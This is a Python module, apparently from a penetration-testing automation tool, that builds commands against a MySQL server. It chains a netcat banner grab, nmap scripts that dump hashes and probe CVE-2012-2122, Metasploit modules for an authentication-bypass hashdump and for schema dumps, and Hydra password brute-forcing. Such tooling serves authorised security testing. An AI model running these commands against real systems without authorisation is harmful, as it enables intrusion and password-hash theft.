# -*- coding: utf-8 -*-

from warriors.warrior import Warrior


class Mysql_warrior (Warrior):
    def __init__(self, host, port, workdir, protocol, intensity, username, ulist, password, plist, notuse, extensions, path, reexec, ipv6, domain, interactive, verbose, executed, exec):
        Warrior.__init__(self, host, port, workdir, protocol, intensity, username, ulist, password, plist, notuse, extensions, path, reexec, ipv6, domain, interactive, verbose, executed, exec)

        self.cmds = [
            {"name": self.proto+"_version_"+self.port, "cmd": 'nc -w 20 -q 1 -vn ' + self.host + ' ' + self.port + ' </dev/null', "shell": True, "chain": False},
            {"name": self.proto+"_nmap_"+self.port, "cmd": 'nmap -n -sV --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -p ' + self.port + ' ' + self.host, "shell": True, "chain": False},

        ]

        msfmodules = [
            {"path": "auxiliary/scanner/mysql/mysql_version", "toset": {"RHOSTS": self.host, "RPORT": self.port}},
            {"path": "auxiliary/scanner/mysql/mysql_authbypass_hashdump", "toset": {"RHOSTS": self.host, "RPORT": self.port}},
        ]
        self.cmds.append(
            {"name": self.proto+"_msf_"+self.port, "cmd": self.create_msf_cmd(msfmodules), "shell": True, "chain": False})

        if self.intensity >= "2":
            self.extra_info = "If you set the username and password, more authenticated metasploit modules will be executed."
            if username != "" and password != "":
                msfmodules_auth = [
                    {"path": "auxiliary/admin/mysql/mysql_enum", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                    {"path": "auxiliary/scanner/mysql/mysql_hashdump", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                    {"path": "auxiliary/scanner/mysql/mysql_schemadump", "toset": {"RHOSTS": self.host, "RPORT": self.port, "USERNAME": self.username, "PASSWORD": self.password}},
                     ]
                self.cmds.append({"name": self.proto+"_msf_auth_"+self.port, "cmd": self.create_msf_cmd(msfmodules_auth), "shell": True, "chain": False})

        if self.intensity == "3":
            self.extra_info = "You can use the variable 'username' to brute force a single username or the variable ulist to bruteforce a list of usernames."
            if username != "":
                self.cmds = [{"name": self.proto+"_brute_hydra_"+self.port, "cmd": 'hydra -f -e ns -l '+self.username+' -P '+self.plist+' -s '+self.port+' '+self.host+' mysql', "shell": True, "chain": False}]
            else:
                self.cmds = [{"name": self.proto+"_brute_hydra_"+self.port, "cmd": 'hydra -f -e ns -L ' + self.ulist + ' -P ' + self.plist + ' -s ' + self.port + ' ' + self.host + ' mysql', "shell": True, "chain": False}]
